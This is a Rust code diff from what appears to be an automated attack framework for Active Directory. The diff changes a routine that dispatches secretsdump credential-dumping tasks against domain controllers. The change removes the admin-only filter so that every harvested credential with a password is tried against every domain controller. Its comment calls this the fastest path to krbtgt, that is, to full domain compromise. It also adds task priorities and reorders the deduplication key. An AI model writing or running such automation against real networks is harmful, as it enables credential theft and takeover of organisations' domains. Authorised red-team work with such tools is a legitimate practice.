@@ -27,24 +27,27 @@ pub async fn auto_local_admin_secretsdump(
             break;
         }
 
-        // Collect admin creds + target DCs
+        // Collect credentials with passwords + target DCs.
+        // Do NOT gate on is_admin — the credential may have admin rights we
+        // haven't confirmed yet. Secretsdump will fail fast if it lacks
+        // privileges, but when it succeeds it's the fastest path to krbtgt.
         let work: Vec<(String, String, ares_core::models::Credential)> = {
             let state = dispatcher.state.read().await;
-            let admin_creds: Vec<_> = state
+            let creds: Vec<_> = state
                 .credentials
                 .iter()
-                .filter(|c| c.is_admin && !c.domain.is_empty())
+                .filter(|c| !c.domain.is_empty() && !c.password.is_empty())
                 .cloned()
                 .collect();
 
             let mut items = Vec::new();
-            for cred in &admin_creds {
+            for cred in &creds {
                 for dc_ip in state.domain_controllers.values() {
                     let dedup = format!(
                         "{}:{}:{}",
                         dc_ip,
-                        cred.username.to_lowercase(),
-                        cred.domain.to_lowercase()
+                        cred.domain.to_lowercase(),
+                        cred.username.to_lowercase()
                     );
                     if !state.is_processed(DEDUP_SECRETSDUMP, &dedup) {
                         items.push((dedup, dc_ip.clone(), cred.clone()));
@@ -55,7 +58,11 @@ pub async fn auto_local_admin_secretsdump(
         };
 
         for (dedup_key, dc_ip, cred) in work.into_iter().take(3) {
-            match dispatcher.request_secretsdump(&dc_ip, &cred, 3).await {
+            let priority = if cred.is_admin { 2 } else { 5 };
+            match dispatcher
+                .request_secretsdump(&dc_ip, &cred, priority)
+                .await
+            {
                 Ok(Some(task_id)) => {
                     info!(task_id = %task_id, dc = %dc_ip, user = %cred.username, "Admin secretsdump dispatched");
                     dispatcher
